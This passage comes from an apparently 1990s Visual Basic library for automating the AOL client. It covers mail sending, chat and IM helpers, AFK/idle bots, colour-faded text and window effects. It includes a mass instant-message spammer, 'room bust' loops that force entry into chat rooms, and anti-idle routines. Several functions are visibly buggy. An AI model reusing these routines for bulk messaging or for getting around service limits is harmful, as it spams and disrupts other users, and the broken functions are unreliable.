Loop Until FindWindow("_AOL_Modal", vbNullString)
SendMessage FindWindow("_AOL_Modal", vbNullString), WM_CLOSE, 0, 0
End Sub


Sub AOL3_MailSend(Person, subject, message)

'Sends Mail
'Use this format:
'Call Mail ("there SN","the subject","message here")

Call Menubystring(Window(), "Compose Mail")
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = Childbyclass(AOL%, "MDIClient")
mailwin% = Childbytitle(MDI%, "Compose Mail")
icone% = Childbyclass(mailwin%, "_AOL_Icon")
peepz% = Childbyclass(mailwin%, "_AOL_Edit")
subjt% = Childbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
mess% = Childbyclass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop
a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, message)
Icon (icone%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = Childbyclass(AOL%, "MDIClient")
mailwin% = Childbytitle(MDI%, "Compose Mail")
erro% = Childbytitle(MDI%, "Error")
aolw% = FindWindow("_AOL_Modal", vbNullString)
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
Button (Childbytitle(aolw%, "OK"))
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Sub
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop

End Sub
Public Sub Button(but%)

'Clicks a button

but% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
but% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub

Sub Aol30_MassIM(Lst As ListBox, txt As TextBox)
Lst.Enabled = False
i = Lst.ListCount - 1
Lst.ListIndex = 0
For X = 0 To i
Lst.ListIndex = X
Call AOL30_IM(Lst.text, txt.text & "<br>•-§-• [ MaceX v1 ] [ mass immer ]")
Pause 0.5
Next X
Lst.Enabled = True
End Sub

Sub Ao3Settext(win, txt)

'Set text will place text in the window you want
'You can rename stuff on AOL with this.

TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub

Sub Ao3Chatsend(txt)

'Sends text to a chatroom.

Room% = FindRoom()
Call Ao3Settext(Childbyclass(Room%, "_AOL_Edit"), txt)
DoEvents
Call Ao3Charnum(Childbyclass(Room%, "_AOL_Edit"), 13)
End Sub

Sub Ao3Charnum(win, chars)

'Sends characters to a window

e = SendMessageByNum(win, WM_CHAR, chars, 0)
End Sub



Function Childbyclass(Parent, child As String) As Integer

'Finds the parent window then it finds the sub
'Your looking to use in the parent window

childfocus% = GetWindow(Parent, 5)

While childfocus%
buffer$ = String$(250, 0)
classbuffer% = GetClassName(childfocus%, buffer$, 250)

If InStr(UCase(buffer$), UCase(child)) Then Childbyclass = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend

End Function

Function Childbytitle(Parent, child As String) As Integer

'Finds the parent window then it finds the sub
'Your looking to use in the parent window

childfocus% = GetWindow(Parent, 5)
While childfocus%
hwndLength% = GetWindowTextLength(childfocus%)
buffer$ = String$(hwndLength%, 0)
WindowText% = GetWindowText(childfocus%, buffer$, (hwndLength% + 1))
If InStr(UCase(buffer$), UCase(child)) Then Childbytitle = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend

End Function

Sub Ao4mailcenter()
AOL% = FindWindow("AOL Frame25", 0&)
toolbar2% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar2%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
TooLBaRB% = GetWindow(TooLBaRB%, 2)
MCenter% = GetWindow(TooLBaRB%, 2)
Ao4Click MCenter%


End Sub


Function AOL4_CountMail()
aol1 = FindWindow("AOL Frame25", vbNullString)
MDI1 = FindChildByClass(aol1, "MDIClient")
Mail11 = Findchildbytitle(MDI1, UserSN & "'s Online Mailbox")
If Mail11 = 0 Then MsgBox "Open Mail First": Exit Function
tabd1 = FindChildByClass(Mail11, "_AOL_TabControl")
tabp1 = FindChildByClass(tabd1, "_AOL_TabPage")
aoltree1 = FindChildByClass(tabp1, "_AOL_Tree")
AOL_CountMail = SendMessage(aoltree1, LB_GETCOUNT, 0, 0)
MsgBox "You Have " & de & " Mailz"
End Function

Sub AFKBoT(msg, Label)
'In a button put Call AFKBoT(msg,label)
'to stop Call AFKBoTStop
Do: DoEvents
txt = msg
BoldBlueBlack ("(¯`·¸ • AFK BOT • ¸·´¯)")
TimeOut 0.3
BoldBlueBlack ("(¯`·¸ • I am AFK because: " & txt & " • ¸·´¯)")
TimeOut 0.3
BoldBlueBlack ("(¯`·¸ • I have been AFK for " + Label1 + " minutes• ¸·´¯)")
TimeOut 0.3
Label.Caption = Val(Label) + 1
TimeOut (60) 'Makes it wait 1 minute
Loop
End Sub

Sub AFKBoTforCC(Label)
'In a button put Call AFKBoT(msg,label)
'to stop Call AFKBoTStop
Do: DoEvents
txt = msg
CooLWavyBlueBlack ("(¯`·¸ • AFK BOT • ¸·´¯)")
TimeOut 0.3
CooLWavyBlueBlack ("(¯`·¸ • I have been AFK for " + Label1 + " minutes• ¸·´¯)")
TimeOut 0.3
Label.Caption = Val(Label) + 1
TimeOut (60) 'Makes it wait 1 minute
Loop
End Sub


Sub IdleBoT(Label)
' i fixed all bugs in this
'to make this code werk put in a button
' Call IdleBot(label)
'To Stop
'Call IdleBotStop
Do: DoEvents
Call AntiIdle
BoldRedBlue ("(¯`·¸ • Idle BOT • ¸·´¯)")
TimeOut 0.3
BoldRedBlue ("(¯`·¸ • Idle for " & Label & " minutes• ¸·´¯)")
TimeOut (60) 'Makes it wait 1 minute
Label.Caption = Val(Label) + 1

Loop
End Sub
Sub IdleBoTStop(Label)
Label.Caption = "0"
Do: DoEvents: Loop

End Sub

Sub AFKBoTStop(Label)
Do: DoEvents: Loop
Label.Caption = "0"
End Sub
Function AOL4_RoomBust(Room, Label As Label)
'i changeed the
'kind of room bust it says how many times
'it took to bust into the room
If AOL_Online = 0 Then Exit Function
AppActivate "America  Online"
Do
Call KeyWord("aol://2719:2-2-" + txt.text)
WaitForOk
Label.Caption = Val(Label) + 1
Loop Until GetRoomName = txt

CooLWavyBlueBlack ("•-§-• [ " + UserSN + " ]")
TimeOut 0.1
CooLWavyBlueBlack ("•-§-• [ Busted into room ] [ " & txt.text & " ]")
TimeOut 0.1
CooLWavyBlueBlack ("•-§-• [ In  ] [ " & Label & " ][tries]")

End Function

Function AOL4_WaitForMailLoad()


Do
Box% = Findchildbytitle(AOLMDI, UserSN & "'s Online Mailbox")
Loop Until Box% <> 0
List = FindChildByClass(Box%, "_AOL_Tree")
Do
DoEvents
M1% = SendMessage(List, LB_GETCOUNT, 0, 0&)
M2% = SendMessage(List, LB_GETCOUNT, 0, 0&)
M3% = SendMessage(List, LB_GETCOUNT, 0, 0&)
Loop Until M1% = M2% And M2% = M3%
M1% = SendMessage(List, LB_GETCOUNT, 0, 0&)
End Function

Sub AOL3Roombust(txt As TextBox)
'crappy aol3 roombust
Do
Call KeyWord("aol://2719:2-2-" & LCase(txt.text))
X = LCase(GetCaption(FindRoom()))
AOL% = FindWindow("AOL Frame25", vbNullString)
cli% = Childbytitle(AOL%, "OK")
a = SendMessage(cli%, WM_CLOSE, 0, 0)
Pause 0.03
Loop Until X = LCase(txt.text)
Pause 0.1
Ao3Chatsend ("•-§-• [ " + UserSN + " ]")
Ao3Chatsend ("•-§-• [ Busted into room ] [ " & txt.text & " ]")

End Sub

Sub AOL4_KillDLadvertise()
'kill download advertisement
home% = Findchildbytitle(AOLMDI, "File Transfer")
dl% = FindChildByClass(home%, "_AOL_Image")
Call SendMessage(dl%, WM_CLOSE, 0, 0)
End Sub


Sub AOL4_KillMailAdvertise()
'kill mail advertisement
mail% = Findchildbytitle(AOLMDI, AOLUserSN & "'s Online Mailbox")
Add% = FindChildByClass(mail%, "_AOL_Image")
Call SendMessage(Add%, WM_CLOSE, 0, 0)
End Sub

Sub AOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub

 Sub AOL4_SetText(win, txt)
'This is usually used for an _AOL_Edit or RICHCNTL
TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub



Sub AOL4_UnUpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_RESTORE)
Call AOL4_SetFocus
End Sub

Function AOL4_UpChat()
'this is an upchat that minimizes the
'upload window
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_HIDE)
X = ShowWindow(die%, SW_MINIMIZE)
Call AOL4_SetFocus
End Function

Function AOL40_ChatLink(Link, txt)
SendChat ("< a href=" + Link + ">" + txt + "</a>")
End Function

Sub AOL40_ClearChat4u()
'This clears it for you only
childs% = FindRoom()
child = FindChildByClass(childs%, "RICHCNTL")
GetTrim = SendMessageByNum(child, 13, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 12, GetTrim + 1, TrimSpace$)
theview$ = TrimSpace$
End Sub

Function AOL40_CurrentRoom()
AOL = FindWindow("AOL Frame25", 0&)
bah = FindChildByClass(AOL, "_AOL_Glyph")
par% = GetParent(bah)
xx$ = getwintext(par%)
AOL40_CurrentRoom = xx$
End Function

Sub AOL40_decripter(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "¿" Then Leet$ = " "
    If letter$ = "†" Then Leet$ = "a"
    If letter$ = "õ" Then Leet$ = "b"
    If letter$ = "ð" Then Leet$ = "c"
    If letter$ = "ô" Then Leet$ = "d"
    If letter$ = "î" Then Leet$ = "e"
    If letter$ = "ï" Then Leet$ = "f"
    If letter$ = "ì" Then Leet$ = "g"
    If letter$ = "é" Then Leet$ = "h"
    If letter$ = "ê" Then Leet$ = "i"
    If letter$ = "ë" Then Leet$ = "j"
    If letter$ = "ä" Then Leet$ = "k"
    If letter$ = "å" Then Leet$ = "l"
    If letter$ = "â" Then Leet$ = "m"
    If letter$ = "ù" Then Leet$ = "n"
    If letter$ = "û" Then Leet$ = "o"
    If letter$ = "ü" Then Leet$ = "p"
    If letter$ = "ç" Then Leet$ = "q"
    If letter$ = "ñ" Then Leet$ = "r"
    If letter$ = "š" Then Leet$ = "s"
    If letter$ = "v" Then Leet$ = "t"
    If letter$ = "ÿ" Then Leet$ = "u"
    If letter$ = "Ø" Then Leet$ = "v"
    If letter$ = "£" Then Leet$ = "w"
    If letter$ = "¹" Then Leet$ = "x"
    If letter$ = "©" Then Leet$ = "y"
    If letter$ = "#" Then Leet$ = "z"
    ' upercase letters
    If letter$ = "Ï" Then Leet$ = "A"
    If letter$ = "Î" Then Leet$ = "B"
    If letter$ = "Í" Then Leet$ = "C"
    If letter$ = "ß" Then Leet$ = "D"
    If letter$ = "Ç" Then Leet$ = "E"
    If letter$ = "Å" Then Leet$ = "F"
    If letter$ = "Ä" Then Leet$ = "G"
    If letter$ = "Ã" Then Leet$ = "H"
    If letter$ = "Ð" Then Leet$ = "I"
    If letter$ = "Ë" Then Leet$ = "J"
    If letter$ = "S" Then Leet$ = "K"
    If letter$ = "&" Then Leet$ = "L"
    If letter$ = "Y" Then Leet$ = "M"
    If letter$ = "W" Then Leet$ = "N"
    If letter$ = ">" Then Leet$ = "O"
    If letter$ = "<" Then Leet$ = "P"
    If letter$ = "Š" Then Leet$ = "Q"
    If letter$ = "Û" Then Leet$ = "R"
    If letter$ = "+" Then Leet$ = "S"
    If letter$ = "=" Then Leet$ = "T"
    If letter$ = "@" Then Leet$ = "U"
    If letter$ = "Ñ" Then Leet$ = "V"
    If letter$ = "%" Then Leet$ = "W"
    If letter$ = "*" Then Leet$ = "X"
    If letter$ = "Õ" Then Leet$ = "Y"
    If letter$ = "~" Then Leet$ = "Z"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next Q
End Sub

Function WinCaption(win)
WinTextLength% = GetWindowTextLength(win)
WinTitle$ = String$(hwndLength%, 0)

WinCaption = WinTitle$
End Function

Public Function FindIM() As Long
    Dim AOL As Long, MDI As Long, child As Long, Caption As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Caption$ = GetCaption(child&)
    If InStr(Caption$, "Instant Message") = 1 Or InStr(Caption$, "Instant Message") = 2 Or InStr(Caption$, "Instant Message") = 3 Then
        FindIM& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Caption$ = GetCaption(child&)
            If InStr(Caption$, "Instant Message") = 1 Or InStr(Caption$, "Instant Message") = 2 Or InStr(Caption$, "Instant Message") = 3 Then
                FindIM& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindIM& = child&
End Function
Function FindIMCaption()
IM% = Findchildbytitle(AOLMDI(), "  Instant Message From:")
FindIMCaption = FindChildByClass(IM%, "_AOL_Static")
End Function


Function FindIMTextwindow()
IM% = Findchildbytitle(AOLMDI(), "  Instant Message From:")
FindIMTextwindow = FindChildByClass(IM%, "RICHCNTL")
End Function

Public Function FindInfoWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim AOLCheck As Long, AOLIcon As Long, AOLStatic As Long
    Dim AOLIcon2 As Long, AOLGlyph As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
    AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
    AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AOLIcon2& = FindWindowEx(child&, AOLIcon&, "_AOL_Icon", vbNullString)
    If AOLCheck& <> 0& And AOLStatic& <> 0& And AOLGlyph& <> 0& And AOLIcon& <> 0& And AOLIcon2& <> 0& Then
        FindInfoWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
            AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
            AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AOLIcon2& = FindWindowEx(child&, AOLIcon&, "_AOL_Icon", vbNullString)
            If AOLCheck& <> 0& And AOLStatic& <> 0& And AOLGlyph& <> 0& And AOLIcon& <> 0& And AOLIcon2& <> 0& Then
                FindInfoWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindInfoWindow& = child&
End Function

Public Function FindRoom() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim Rich As Long, AOLList As Long
    Dim AOLIcon As Long, AOLStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
    AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
    AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
        FindRoom& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
            AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
            AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
                FindRoom& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindRoom& = child&
End Function

Sub FireFade(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255, 255 - intLoop, 0), B 'Draw boxes with specified color of loop
        Next intLoop
End Sub

Function FixAPIString(ByVal sText As String) As String
On Error Resume Next
FixAPIString = Trim(Left$(sText, InStr(sText, Chr$(0)) - 1))
End Function



Sub Form_Explode(F As Form, Movement As Integer)
'this will explode a form
    Dim myRect As RECT
    Dim formWidth%, formHeight%, i%, X%, Y%, cx%, cy%
    Dim TheScreen As Long
    Dim Brush As Long
    
    GetWindowRect F.hwnd, myRect
    formWidth = (myRect.Right - myRect.Left)
    formHeight = myRect.Bottom - myRect.Top
    TheScreen = GetDC(0)
    Brush = CreateSolidBrush(F.BackColor)
    
    For i = 1 To Movement
        cx = formWidth * (i / Movement)
        cy = formHeight * (i / Movement)
        X = myRect.Left + (formWidth - cx) / 2
        Y = myRect.Top + (formHeight - cy) / 2
        Rectangle TheScreen, X, Y, X + cx, Y + cy
    Next i
    
    X = ReleaseDC(0, TheScreen)
    DeleteObject (Brush)
    
End Sub








Sub FormZoom(frm As Form, CFlag As Integer, steps As Integer)

'use like this -- Call FormZoom(Me, True, 600)

Dim FRect As RECT
Dim fWidth, fHeight As Integer
Dim i, X, Y, cx, cy As Integer
Dim hScreen, Brush As Integer, OldBrush
    GetWindowRect frm.hwnd, FRect
    fWidth = (FRect.Right - FRect.Left)
    fHeight = FRect.Bottom - FRect.Top

    hScreen = GetDC(0)
    Brush = CreateSolidBrush(frm.BackColor)
    OldBrush = SelectObject(hScreen, Brush)
    For i = 1 To steps
        cx = fWidth * (i / steps)
        cy = fHeight * (i / steps)
        If CFlag Then
            X = FRect.Left + (fWidth - cx) / 2
            Y = FRect.Top + (fHeight - cy) / 2
        Else
            X = FRect.Left
            Y = FRect.Top
        End If
        Rectangle hScreen, X, Y, X + cx, Y + cy
    Next i
    If ReleaseDC(0, hScreen) = 0 Then
        MsgBox "Unable to Release Device Context", 16, "Device Error"
    End If
    X = DeleteObject(Brush%)
    frm.Show
End Sub

Function GetAOLVer()
'returns What version the User is using
AOL% = FindWindow("AOL Frame25", vbNullString)
hMenu% = GetMenu(AOL%)

SubMenu% = GetSubMenu(hMenu%, 0)
SubItem% = GetMenuItemID(SubMenu%, 8)
MenuString$ = String$(100, " ")

FindString% = GetMenuString(SubMenu%, SubItem%, MenuString$, 100, 1)

If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
GetAOLVer = 4
Else
GetAOLVer = 3
End If
End Function

Function getwintext(hwnd As Integer) As String
lentos = SendMessage(hwnd, WM_GETTEXTLENGTH, 0&, 0&)
buffer$ = Space$(lentos)
X = SendMessageByString(hwnd, WM_GETTEXT, lentos + 1, buffer$)
getwintext = buffer$
End Function

Sub IM_BlueGreen(Person$, TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#0000FF>" & ab$ & "<FONT COLOR=#001199>" & u$ & "<FONT COLOR=#002288>" & S$ & "<FONT COLOR=#00003377>" & T$ & "<FONT COLOR=#004466>" & Y$ & "<FONT COLOR=#005555>" & l$ & "<FONT COLOR=#006644>" & F$ & "<FONT COLOR=#007733>" & B$ & "<FONT COLOR=#008822>" & c$ & "<FONT COLOR=#009911>" & D$ & "<FONT COLOR=#008822>" & H$ & "<FONT COLOR=#007733>" & j$ & "<FONT COLOR=#006644>" & K$ & "<FONT COLOR=#005555>" & M$ & "<FONT COLOR=#004466>" & n$ & "<FONT COLOR=#003377>" & Q$ & "<FONT COLOR=#002288>" & V$ & "<FONT COLOR=#001199>" & z$
Next W
Call AOL4_IM(Person$, PC$)
End Sub





Public Sub IMIgnore(Person As String)
    Call AOL4_IM("$IM_OFF, " & Person$, "=)")
End Sub



Sub IM_RedYeLLoW(Person$, TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#FFFF00>" & u$ & "<FONT COLOR=#002288>" & S$ & "<FONT COLOR=#00003377>" & T$ & "<FONT COLOR=#004466>" & Y$ & "<FONT COLOR=#00FF00>" & l$ & "<FONT COLOR=#006644>" & F$ & "<FONT COLOR=#007733>" & B$ & "<FONT COLOR=#008822>" & c$ & "<FONT COLOR=#009911>" & D$ & "<FONT COLOR=#008822>" & H$ & "<FONT COLOR=#007733>" & j$ & "<FONT COLOR=#006644>" & K$ & "<FONT COLOR=#005555>" & M$ & "<FONT COLOR=#004466>" & n$ & "<FONT COLOR=#003377>" & Q$ & "<FONT COLOR=#002288>" & V$ & "<FONT COLOR=#001199>" & z$
Next W
Call AOL4_IM(Person$, PC$)
End Sub






Sub IM_BlueRed(Person$, TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#0000FF>" & ab$ & "<FONT COLOR=#FF0000>" & u$ & "<FONT COLOR=#002288>" & S$ & "<FONT COLOR=#00003377>" & T$ & "<FONT COLOR=#004466>" & Y$ & "<FONT COLOR=#005555>" & l$ & "<FONT COLOR=#006644>" & F$ & "<FONT COLOR=#007733>" & B$ & "<FONT COLOR=#008822>" & c$ & "<FONT COLOR=#009911>" & D$ & "<FONT COLOR=#008822>" & H$ & "<FONT COLOR=#007733>" & j$ & "<FONT COLOR=#006644>" & K$ & "<FONT COLOR=#005555>" & M$ & "<FONT COLOR=#004466>" & n$ & "<FONT COLOR=#003377>" & Q$ & "<FONT COLOR=#002288>" & V$ & "<FONT COLOR=#001199>" & z$
Next W
Call AOL4_IM(Person$, PC$)
End Sub





Sub IM_RedGreen(Person$, TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#001199>" & u$ & "<FONT COLOR=#002288>" & S$ & "<FONT COLOR=#00003377>" & T$ & "<FONT COLOR=#004466>" & Y$ & "<FONT COLOR=#00FF00>" & l$ & "<FONT COLOR=#006644>" & F$ & "<FONT COLOR=#007733>" & B$ & "<FONT COLOR=#008822>" & c$ & "<FONT COLOR=#009911>" & D$ & "<FONT COLOR=#008822>" & H$ & "<FONT COLOR=#007733>" & j$ & "<FONT COLOR=#006644>" & K$ & "<FONT COLOR=#005555>" & M$ & "<FONT COLOR=#004466>" & n$ & "<FONT COLOR=#003377>" & Q$ & "<FONT COLOR=#002288>" & V$ & "<FONT COLOR=#001199>" & z$
Next W
Call AOL4_IM(Person$, PC$)
End Sub


Sub Icon(Icon%)

'Clicks an icon

Click2% = SendMessage(Icon%, WM_LBUTTONDOWN, 0, 0&)
Click2% = SendMessage(Icon%, WM_LBUTTONUP, 0, 0&)
End Sub



Public Sub IMRespond(msg As String)
    Dim IM As Long, Rich As Long, Icon As Long
    IM& = FindIM&
    If IM& = 0& Then Exit Sub
    Rich& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
    Rich& = FindWindowEx(IM&, Rich&, "RICHCNTL", vbNullString)
    Icon& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Icon& = FindWindowEx(IM&, Icon&, "_AOL_Icon", vbNullString)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, msg$)
    DoEvents
    Call SendMessage(Icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Icon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub IMUnIgnore(Person As String)
    Call AOL4_IM("$IM_ON, " & Person$, "=)")
End Sub


Sub MaIL_Fade(Person$, txt As String, TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
